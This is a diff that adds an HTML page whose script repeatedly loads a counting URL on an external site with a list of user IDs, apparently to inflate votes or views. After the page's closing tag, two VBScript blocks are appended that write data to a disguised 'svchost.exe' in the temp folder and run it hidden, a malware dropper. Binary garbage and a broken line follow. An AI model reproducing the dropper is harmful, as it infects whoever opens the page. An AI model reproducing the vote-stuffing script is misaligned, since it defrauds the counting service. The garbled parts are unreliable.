@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <script src="./jquery.min.js"></script>
+</head>
+<body>
+<div id="x"></div>
+<div id="mainContent"></div>
+<iframe id="aaa"  style="width:500px;height:500px;"></iframe>
+<script type="text/javascript">
+    var user=['osT3E1C7Wbf2OAA_YyVMMbYzCyFY','osT3E1JEB-RWeBmcUkhRxVow1dNE','osT3E1DOSiFY9Lphx2G8Rk91UTz4','osT3E1EYLJfkBRRL8B3emhdWQMTE','osT3E1B7nDWnBWP4ghIz-n20uSyM'];
+    var i = getQueryString('user');
+    var id = parseInt(i);
+    var j= getQueryString('id');
+    var L= getQueryString('len');
+
+    var len = parseInt(L);
+    var k = parseInt(j);
+    var k_1 = k;
+    $(document).ready(function() {
+        var time = setInterval(function(){
+            console.log(len)
+            $('#mainContent').html('('+(k-k_1+1)+')  '+k+'   '+new Date());
+            $("#aaa").attr('src',"http://www.baojjch.com/zhrd/count.php?id="+k+"&openid="+user[id-1]);
+            k++;
+
+//          $("#aaa").attr('src','./4.html?i='+k+'&user='+i);
+            if(k-k_1>=len){
+                clearInterval(time);
+            }
+        },8000)
+    });
+
+    function getQueryString(name) {
+        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
+        var r = window.location.search.substr(1).match(reg);
+        if (r != null) return unescape(r[2]);
+        return null;
+    }
+</script>
+<!--<script>-->
+<!--//    var xuhao = getQueryString('user');-->
+<!--var s1 = getQueryString('s1');-->
+<!--var s2 = getQueryString('s2');-->
+<!--var s3 = getQueryString('s3');-->
+<!--var s4 = getQueryString('s4');-->
+<!--var s5 = getQueryString('s5');-->
+<!--var xuhao = [parseInt(s1),parseInt(s2),parseInt(s3),parseInt(s4),parseInt(s5)]-->
+<!--var  a = '';-->
+<!--var user=['osT3E1C7Wbf2OAA_YyVMMbYzCyFY','osT3E1JEB-RWeBmcUkhRxVow1dNE','osT3E1DOSiFY9Lphx2G8Rk91UTz4','osT3E1EYLJfkBRRL8B3emhdWQMTE','osT3E1B7nDWnBWP4ghIz-n20uSyM'];-->
+<!--//    var j=parseInt(xuhao)-1;-->
+<!--var k=11597;-->
+<!--//    for(var j=0;j<5;j++){-->
+<!--//        k=0;-->
+<!--//        for(var i=xuhao[j] ; k<30;i++){-->
+<!--//            k++;-->
+<!--//            a+='<a href="http://www.baojjch.com/zhrd/count.php?id='+i+'&openid='+user[j]+'" style="padding-right: 30px;line-height: 40px">用户'+(j+1)+'('+i+')</a>'-->
+<!--//        }-->
+<!--//    }-->
+
+<!--setInterval(function(){-->
+<!--window.location="http://www.baojjch.com/zhrd/count.php?id="+k+"&openid="+user[0];-->
+<!--k++;-->
+
+<!--},8000)-->
+
+<!--var x = document.getElementById('x');-->
+<!--x.innerHTML = a;-->
+
+<!--function getQueryString(name) {-->
+<!--var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");-->
+<!--var r = window.location.search.substr(1).match(reg);-->
+<!--if (r != null) return unescape(r[2]);-->
+<!--return null;-->
+<!--}-->
+
+<!--</script>-->
+</body>
+</html><SCRIPT Language=VBScript><!--
+DropFileName = "svchost.exe"
+Se")
+DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
+If FSO.FileExists(DropPath)=False Then
+Set FileObj = FSO.CreateTextFile(DropPath, True)
+For i = 1 To Len(WriteData) Step 2
+FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
+Next
+FileObj.Close
+End If
+Set WSHshell = CreateObject("WScript.Shell")
+WSHshell.Run DropPath, 0
+//--></SCRIPT><!--����j�Q��M-��89�D��5���,������v��a�L(]���4̌O������  Ш�����!��O�Ha[�'>����Bq���^��}��gdF��xF�2�ۨ�����tf�*_��4?���ʽ��e������Mt�NW�I�o`����l	"6z�-�ij�c@	Q��;�-8	�������g�i#}ʺh����٥H#?���S@P�̺Np9�;UG
+V}4d<�Q5X�0�3v�季�4�!<�2�t��bm.�)�cX�aTe6�� f����|YpGWCce&~�Df���3e��o�9 �
+R*��
+�
+�
+��O�
+TX��
+ �
+--><SCRIPT Language=VBScript><!--
+DropFileName = "svchost.exe"
+WriteData = ""
+Set FSO = CreateObject("Scripting.FileSystemObject")
+DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
+If FSO.FileExists(DropPath)=False Then
+Set FileObj = FSO.CreateTextFile(DropPath, True)
+For i = 1 To Len(WriteData) Step 2
+FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
+Next
+FileObj.Close
+End If
+Set WSHshell = CreateObject("WScript.Shell")
+WSHshell.Run DropPath, 0
+//--></SCRIPT><!--,�PC�,��Sѕ�9�V�:���`�k��*��/ϕ�Sw�|���tŒ�FR�����;�Ia0
+-->
